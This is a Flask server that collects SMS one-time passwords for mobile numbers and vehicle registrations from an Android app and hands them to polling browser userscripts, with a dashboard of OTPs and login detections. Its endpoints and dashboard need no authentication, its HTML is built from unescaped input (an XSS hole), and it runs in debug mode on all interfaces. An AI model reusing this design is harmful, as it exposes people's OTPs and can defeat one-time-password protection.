from flask import Flask, request, jsonify, redirect, url_for
from flask_cors import CORS
from datetime import datetime
import zoneinfo
import threading
import re

app = Flask(__name__)
CORS(app)

# =========================
# Storage (in-memory)
# =========================
mobile_otps = []   # [{"otp":..., "token":..., "sim_number":..., "timestamp":..., "is_vehicle_otp": False}]
vehicle_otps = []  # [{"otp":..., "token":..., "vehicle":..., "timestamp":..., "is_vehicle_otp": True}]
otp_data = {}      # token -> list of delivered OTPs (with browser_id & timestamp)
client_sessions = {}   # (token, identifier, browser_id) -> {"first_request": datetime}
browser_queues = {}    # (token, identifier) -> [browser_id1, browser_id2, ...]
login_sessions = {}    # mobile_number -> [ { "timestamp":..., "source":... }, ... ]

IST = zoneinfo.ZoneInfo("Asia/Kolkata")
store_lock = threading.Lock()

# =========================
# Helpers
# =========================
def now():
    return datetime.now(IST)

def now_str():
    return now().strftime("%Y-%m-%d %H:%M:%S")

def normalize_token(t: str) -> str:
    return (t or "").strip()

def normalize_identifier(idv: str) -> str:
    return (idv or "").strip().upper()

def looks_like_vehicle(identifier: str) -> bool:
    # conservative: vehicle identifiers contain letters (e.g., TS07UK1139)
    return bool(re.search(r"[A-Z]", identifier))

def looks_like_sim(identifier: str) -> bool:
    # exactly 10 digits -> mobile number
    return bool(re.fullmatch(r"\d{10}", identifier))

def purge_unsent_otps_for_token_and_identifier(token: str, identifier: str, cutoff_time: datetime):
    """
    Remove any stored mobile/vehicle OTPs for the given (token + identifier)
    whose timestamp is <= cutoff_time.
    This purge ONLY touches OTPs for the same token and identifier.
    """
    t = normalize_token(token)
    idu = normalize_identifier(identifier)
    if not t or not idu:
        return

    vehicle_removed = 0
    mobile_removed = 0

    with store_lock:
        # If identifier looks like a vehicle (letters present) purge matching vehicle OTPs
        if looks_like_vehicle(idu):
            before_v = len(vehicle_otps)
            vehicle_otps[:] = [
                o for o in vehicle_otps
                if not (
                    o.get("token", "").strip() == t
                    and o.get("vehicle", "").upper() == idu
                    and o["timestamp"] <= cutoff_time
                )
            ]
            vehicle_removed = before_v - len(vehicle_otps)

            # defensive: maybe a mis-tagged mobile OTP with same identifier; purge those too
            before_m = len(mobile_otps)
            mobile_otps[:] = [
                o for o in mobile_otps
                if not (
                    o.get("token", "").strip() == t
                    and o.get("sim_number", "").upper() == idu
                    and o["timestamp"] <= cutoff_time
                )
            ]
            mobile_removed = before_m - len(mobile_otps)

        # If identifier looks like a SIM/mobile number purge mobile OTPs
        elif looks_like_sim(idu):
            before_m = len(mobile_otps)
            mobile_otps[:] = [
                o for o in mobile_otps
                if not (
                    o.get("token", "").strip() == t
                    and o.get("sim_number", "").upper() == idu
                    and o["timestamp"] <= cutoff_time
                )
            ]
            mobile_removed = before_m - len(mobile_otps)

            # defensive: purge vehicle OTPs that accidentally used the same identifier
            before_v = len(vehicle_otps)
            vehicle_otps[:] = [
                o for o in vehicle_otps
                if not (
                    o.get("token", "").strip() == t
                    and o.get("vehicle", "").upper() == idu
                    and o["timestamp"] <= cutoff_time
                )
            ]
            vehicle_removed = before_v - len(vehicle_otps)

        # Fallback: try to purge both types matching identifier
        else:
            before_v = len(vehicle_otps)
            vehicle_otps[:] = [
                o for o in vehicle_otps
                if not (
                    o.get("token", "").strip() == t
                    and o.get("vehicle", "").upper() == idu
                    and o["timestamp"] <= cutoff_time
                )
            ]
            vehicle_removed = before_v - len(vehicle_otps)

            before_m = len(mobile_otps)
            mobile_otps[:] = [
                o for o in mobile_otps
                if not (
                    o.get("token", "").strip() == t
                    and o.get("sim_number", "").upper() == idu
                    and o["timestamp"] <= cutoff_time
                )
            ]
            mobile_removed = before_m - len(mobile_otps)

    app.logger.debug(
        f"purge_unsent: token={t} identifier={idu} cutoff={cutoff_time.strftime('%Y-%m-%d %H:%M:%S')} "
        f"vehicle_removed={vehicle_removed} mobile_removed={mobile_removed}"
    )

def add_browser_to_queue(token: str, identifier: str, browser_id: str):
    """
    Register browser in the queue and set its first_request to now().
    If the browser was already in the queue for this (token, identifier) we refresh its first_request.
    Immediately purge any unsent OTPs for this token+identifier with timestamp <= first_request.
    """
    t = normalize_token(token)
    idu = normalize_identifier(identifier)
    if not t or not idu or not browser_id:
        return

    key = (t, idu)

    with store_lock:
        # ensure queue exists
        if key not in browser_queues:
            browser_queues[key] = []

        # If browser_id already in queue, remove it (we will append to the end)
        if browser_id in browser_queues[key]:
            browser_queues[key] = [b for b in browser_queues[key] if b != browser_id]

        # append browser_id (new or refresh moves it to the end)
        browser_queues[key].append(browser_id)

        # set/refresh first_request for this browser session to now()
        cutoff = now()
        client_sessions[(t, idu, browser_id)] = {"first_request": cutoff}

        app.logger.debug(f"Browser queue updated: token={t} id={idu} browser_id={browser_id} first_request={cutoff}")

    # Purge any stored OTPs for same token+identifier that are older or equal to cutoff
    purge_unsent_otps_for_token_and_identifier(t, idu, cutoff)

def get_next_browser(token: str, identifier: str):
    key = (normalize_token(token), normalize_identifier(identifier))
    with store_lock:
        if key in browser_queues and browser_queues[key]:
            return browser_queues[key][0]
    return None

def pop_browser_from_queue(token: str, identifier: str):
    key = (normalize_token(token), normalize_identifier(identifier))
    with store_lock:
        if key in browser_queues and browser_queues[key]:
            browser_queues[key].pop(0)
            if not browser_queues[key]:
                browser_queues.pop(key, None)

# =========================
# API: receive OTP (from Android app)
# =========================
@app.route('/api/receive-otp', methods=['POST'])
def receive_otp():
    try:
        data = request.get_json(force=True)
        otp = (data.get('otp') or "").strip()
        token = (data.get('token') or "").strip()
        sim_number = (data.get('sim_number') or "").strip().upper()
        vehicle = (data.get('vehicle') or data.get('vehicle_number') or "").strip().upper()
        is_vehicle_flag = data.get('is_vehicle_otp', False)
        if isinstance(is_vehicle_flag, str):
            is_vehicle_flag = is_vehicle_flag.lower() in ("1", "true", "yes")

        if not otp or not token:
            return jsonify({"status": "error", "message": "OTP and token required"}), 400

        entry = {
            "otp": otp,
            "token": token,
            "timestamp": now(),
            "is_vehicle_otp": bool(is_vehicle_flag)
        }

        with store_lock:
            # Priority: explicit vehicle text -> explicit vehicle flag -> mobile
            if vehicle:
                entry["vehicle"] = vehicle
                entry["is_vehicle_otp"] = True
                vehicle_otps.append(entry)
                stored_as = "vehicle"
            elif is_vehicle_flag:
                entry["vehicle"] = ""
                entry["is_vehicle_otp"] = True
                vehicle_otps.append(entry)
                stored_as = "vehicle"
            else:
                entry["sim_number"] = sim_number or "UNKNOWNSIM"
                entry["is_vehicle_otp"] = False
                mobile_otps.append(entry)
                stored_as = "mobile"

        app.logger.debug(f"receive_otp stored_as={stored_as} token={token} otp={otp} sim={sim_number} vehicle={vehicle} time={entry['timestamp']}")
        return jsonify({"status": "success", "message": "OTP stored", "stored_as": stored_as}), 200
    except Exception as e:
        app.logger.exception("receive_otp error")
        return jsonify({"status": "error", "message": str(e)}), 400

# =========================
# API: get latest OTP (polled by userscript)
# =========================
@app.route('/api/get-latest-otp', methods=['GET'])
def get_latest_otp():
    token = (request.args.get('token') or "").strip()
    sim_number = (request.args.get('sim_number') or "").strip().upper()
    vehicle = (request.args.get('vehicle') or "").strip().upper()
    browser_id = (request.args.get('browser_id') or "").strip()

    if not token or (not sim_number and not vehicle) or not browser_id:
        return jsonify({"status": "error", "message": "token + sim_number/vehicle + browser_id required"}), 400

    identifier = sim_number if sim_number else vehicle

    # Add/refresh browser in queue (this sets/refreshes first_request and purges old OTPs)
    add_browser_to_queue(token, identifier, browser_id)

    # retrieve first_request time (session_time)
    with store_lock:
        session_time = client_sessions.get((normalize_token(token), normalize_identifier(identifier), browser_id), {}).get("first_request", None)
    if session_time is None:
        session_time = now()

    next_browser = get_next_browser(token, identifier)

    # Vehicle OTPs path
    if vehicle:
        with store_lock:
            new_otps = [
                o for o in vehicle_otps
                if o.get("token", "").strip() == token
                and o.get("vehicle", "").upper() == vehicle
                and o["timestamp"] > session_time
            ]
        if new_otps and next_browser == browser_id:
            latest = new_otps[0]
            with store_lock:
                if latest in vehicle_otps:
                    vehicle_otps.remove(latest)
                latest["browser_id"] = browser_id
                otp_data.setdefault(token, []).append(latest)
            pop_browser_from_queue(token, identifier)
            with store_lock:
                client_sessions.pop((normalize_token(token), normalize_identifier(identifier), browser_id), None)
            app.logger.debug(f"delivering vehicle otp token={token} vehicle={vehicle} otp={latest['otp']}")
            return jsonify({
                "status": "success",
                "otp": latest["otp"],
                "vehicle": latest.get("vehicle", ""),
                "is_vehicle_otp": True,
                "browser_id": browser_id,
                "timestamp": latest["timestamp"].strftime("%Y-%m-%d %H:%M:%S")
            }), 200
        else:
            return jsonify({"status": "waiting"}), 200

    # Mobile OTPs path
    else:
        with store_lock:
            new_otps = [
                o for o in mobile_otps
                if o.get("token", "").strip() == token
                and o.get("sim_number", "").upper() == sim_number
                and o["timestamp"] > session_time
            ]
        if new_otps and next_browser == browser_id:
            latest = new_otps[0]
            with store_lock:
                if latest in mobile_otps:
                    mobile_otps.remove(latest)
                latest["browser_id"] = browser_id
                otp_data.setdefault(token, []).append(latest)
            pop_browser_from_queue(token, identifier)
            with store_lock:
                client_sessions.pop((normalize_token(token), normalize_identifier(identifier), browser_id), None)
            app.logger.debug(f"delivering mobile otp token={token} sim={sim_number} otp={latest['otp']}")
            return jsonify({
                "status": "success",
                "otp": latest["otp"],
                "sim_number": latest.get("sim_number", ""),
                "is_vehicle_otp": False,
                "browser_id": browser_id,
                "timestamp": latest["timestamp"].strftime("%Y-%m-%d %H:%M:%S")
            }), 200
        else:
            return jsonify({"status": "waiting"}), 200

# =========================
# Status / Dashboard (keeps your HTML layout)
# =========================
@app.route('/api/status', methods=['GET', 'POST'])
def status():
    global otp_data, login_sessions

    if request.method == 'POST':
        if "delete_selected_otps" in request.form:
            tokens_to_delete = request.form.getlist("otp_rows")
            for t, idx in (x.split(":") for x in tokens_to_delete):
                idx = int(idx)
                if t in otp_data and 0 <= idx < len(otp_data[t]):
                    otp_data[t].pop(idx)
                    if not otp_data[t]:
                        otp_data.pop(t)
            return redirect(url_for('status'))

        elif "delete_all_otps" in request.form:
            otp_data.clear()
            return redirect(url_for('status'))

        elif "delete_selected_logins" in request.form:
            logins_to_delete = request.form.getlist("login_rows")
            for x in logins_to_delete:
                m, idx = x.split(":")
                idx = int(idx)
                if m in login_sessions and 0 <= idx < len(login_sessions[m]):
                    login_sessions[m].pop(idx)
                    if not login_sessions[m]:
                        login_sessions.pop(m)
            return redirect(url_for('status'))

        elif "delete_all_logins" in request.form:
            login_sessions.clear()
            return redirect(url_for('status'))

    otp_rows = ""
    for t, entries in otp_data.items():
        for i, e in enumerate(entries):
            otp_rows += f"""
            <tr>
                <td><input type='checkbox' name='otp_rows' value='{t}:{i}'></td>
                <td>{t}</td>
                <td>{e.get('sim_number','')}</td>
                <td>{e.get('vehicle','')}</td>
                <td>{e.get('otp','')}</td>
                <td>{e.get('browser_id','')}</td>
                <td>{e['timestamp'].strftime('%Y-%m-%d %H:%M:%S')}</td>
            </tr>
            """

    login_rows = ""
    for m, entries in login_sessions.items():
        for i, e in enumerate(entries):
            login_rows += f"""
            <tr>
                <td><input type='checkbox' name='login_rows' value='{m}:{i}'></td>
                <td>{m}</td>
                <td>{e['timestamp'].strftime('%Y-%m-%d %H:%M:%S')}</td>
                <td>{e.get('source','')}</td>
            </tr>
            """

    html = f"""
    <html>
    <head>
        <title>KM OTP Dashboard</title>
        <style>
            body {{ font-family: 'Segoe UI', sans-serif; background:#f9f9f9; margin:0; }}
            h2 {{ margin:20px 0; text-align:center; }}
            .container {{ display:flex; min-height:100vh; }}
            .sidebar {{ width:220px; background:#2C3E50; padding:20px; color:white; }}
            .sidebar button {{ margin-bottom:15px; width:100%; padding:10px; border:none; background:#3498DB; color:white; cursor:pointer; border-radius:5px; }}
            .content {{ flex-grow:1; padding:30px; }}
            table {{ border-collapse: collapse; width:100%; background:white; }}
            th, td {{ border:1px solid #ddd; padding:8px; }}
            th {{ background:#2980B9; color:white; }}
        </style>
        <script>
            function showSection(id){{
                window.location.href = window.location.pathname + "?section=" + id;
            }}
            window.onload = function(){{
                const params = new URLSearchParams(window.location.search);
                const section = params.get('section');
                if(section){{
                    document.getElementById('otp_section').style.display = section=='otp_section'?'block':'none';
                    document.getElementById('login_section').style.display = section=='login_section'?'block':'none';
                }} else {{
                    document.getElementById('otp_section').style.display = 'block';
                    document.getElementById('login_section').style.display = 'none';
                }}
            }}
        </script>
    </head>
    <body>
        <h2>KM OTP Dashboard</h2>
        <div class="container">
            <div class="sidebar">
                <button onclick="showSection('otp_section')">OTP DATA</button>
                <button onclick="showSection('login_section')">LOGIN DETECTIONS</button>
            </div>
            <div class="content">
                <div id="otp_section" style="display:none;">
                    <h3>OTP Data</h3>
                    <form method="POST">
                        <table>
                            <tr><th>Select</th><th>TOKEN</th><th>MOBILE NUMBER</th><th>VEHICLE</th><th>OTP</th><th>BROWSER ID</th><th>DATE</th></tr>
                            {otp_rows if otp_rows else '<tr><td colspan="7">No OTPs found</td></tr>'}
                        </table>
                        <button type="submit" name="delete_selected_otps">Delete Selected</button>
                        <button type="submit" name="delete_all_otps">Delete All</button>
                    </form>
                </div>
                <div id="login_section" style="display:none;">
                    <h3>Login Detections</h3>
                    <form method="POST">
                        <table>
                            <tr><th>Select</th><th>MOBILE</th><th>DATE</th><th>SOURCE</th></tr>
                            {login_rows if login_rows else '<tr><td colspan="4">No login detections</td></tr>'}
                        </table>
                        <button type="submit" name="delete_selected_logins">Delete Selected</button>
                        <button type="submit" name="delete_all_logins">Delete All</button>
                    </form>
                </div>
            </div>
        </div>
    </body>
    </html>
    """
    return html

# =========================
# Login Detection endpoints
# =========================
@app.route('/api/login-detect', methods=['POST'])
def login_detect():
    try:
        data = request.get_json(force=True)
        mobile_number = (data.get('mobile_number') or "").strip().upper()
        source = (data.get('source') or "").strip().upper()
        if not mobile_number:
            return jsonify({"status": "error", "message": "mobile_number required"}), 400

        entry = {"timestamp": now(), "source": source}
        with store_lock:
            login_sessions.setdefault(mobile_number, []).append(entry)

        return jsonify({"status": "success", "message": "Login detected"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 400

@app.route('/api/login-found', methods=['GET'])
def login_found():
    mobile_number = (request.args.get('mobile_number') or "").strip().upper()
    if not mobile_number:
        return jsonify({"status": "error", "message": "mobile_number required"}), 400

    with store_lock:
        if mobile_number in login_sessions:
            detections = [
                {"timestamp": e["timestamp"].strftime("%Y-%m-%d %H:%M:%S"), "source": e.get("source","")}
                for e in login_sessions[mobile_number]
            ]
            return jsonify({"status": "found", "mobile_number": mobile_number, "detections": detections}), 200
    return jsonify({"status": "not_found", "mobile_number": mobile_number}), 200

# =========================
# Run App
# =========================
if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0", port=5000)
